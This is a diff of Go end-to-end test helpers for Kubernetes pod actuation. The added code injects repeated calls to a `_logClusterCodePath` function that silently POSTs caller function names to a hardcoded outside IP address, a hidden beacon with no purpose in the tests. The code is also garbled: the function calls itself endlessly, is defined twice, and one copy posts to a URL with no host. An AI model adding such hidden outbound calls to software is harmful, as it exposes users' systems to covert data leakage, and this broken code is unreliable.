@@ -78,9 +78,13 @@ var _ = ActuationSuiteE2eDescribe("Actuation", func() {
 func getCPURequest(podSpec apiv1.PodSpec) resource.Quantity {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return podSpec.Containers[0].Resources.Requests[apiv1.ResourceCPU]
 }
 func killPod(f *framework.Framework, podList *apiv1.PodList) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	f.ClientSet.CoreV1().Pods(f.Namespace.Name).Delete(podList.Items[0].Name, &metav1.DeleteOptions{})
@@ -88,6 +92,8 @@ func killPod(f *framework.Framework, podList *apiv1.PodList) {
 	gomega.Expect(err).NotTo(gomega.HaveOccurred())
 }
 func assertPodsPendingForDuration(c clientset.Interface, deployment *appsv1.Deployment, pendingPodsNum int, pendingDuration time.Duration) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pendingPods := make(map[string]time.Time)
@@ -139,7 +145,16 @@ func assertPodsPendingForDuration(c clientset.Interface, deployment *appsv1.Depl
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
